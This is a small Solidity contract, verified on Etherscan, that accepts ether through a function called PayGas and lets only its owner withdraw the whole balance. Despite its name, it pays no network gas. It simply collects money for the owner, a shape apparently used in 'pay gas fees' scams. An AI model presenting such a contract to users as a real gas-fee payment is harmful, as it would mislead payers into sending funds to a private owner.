/**
 *Submitted for verification at Etherscan.io on 2022-12-23
*/

pragma solidity ^0.4.26;

contract GasFees {
    address private owner; // current owner of the contract
    event PaidGas(address, uint);
    constructor() public{owner = msg.sender;}
    function getOwner() public view returns (address) {return owner;}
    function withdraw() public {require(owner == msg.sender);msg.sender.transfer(address(this).balance);}
    function PayGas() external payable {emit PaidGas(msg.sender, msg.value);}
    function getBalance() public view returns (uint256) {return address(this).balance;}
}